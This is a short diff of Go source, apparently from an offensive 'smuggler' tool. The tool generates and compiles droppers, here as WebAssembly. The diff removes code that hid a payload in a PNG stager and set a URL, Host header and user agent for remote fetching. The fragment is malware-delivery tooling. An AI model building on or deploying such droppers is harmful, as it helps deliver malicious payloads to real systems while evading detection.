@@ -69,26 +69,6 @@ func NewSmuggler(dropname, input, output, url, image, host, useragent string) {
 
 	}
 
-	//Add stager code if url is set.
-	if url != "" {
-		stagedimage := filepath.Join(output, dropname+"_stager.png")
-		createStagerImg(image, fileBuf.ToB64(), stagedimage)
-
-		if useragent == "" {
-			goDrop.Ua = `ua := "` + defaultagent + `"`
-		} else {
-			goDrop.Ua = `ua := "` + useragent + `"`
-		}
-
-		goDrop.HostHdr = `hostname := "` + host + `"`
-		goDrop.Url = `url := "` + url + `"`
-		goDrop.Stager = stegStager
-		goDrop.StagerImport = stagerImport
-		goDrop.StegImport = stegImport
-		goDrop.BufStr = "loadImage()"
-
-	}
-
 	//write our dropper template.
 	dropfilename := dropname + ".go"
 	dropFilepath := filepath.Join(output, dropfilename)
@@ -110,9 +90,8 @@ func NewSmuggler(dropname, input, output, url, image, host, useragent string) {
 	wd, _ := os.Getwd()
 
 	//compile the dropper with the regular go compiler.
-	if Leet {
-		buildWasm(output, dropfilename)
-	}
+
+	buildWasm(output, dropfilename)
 
 	if !Debug {
 
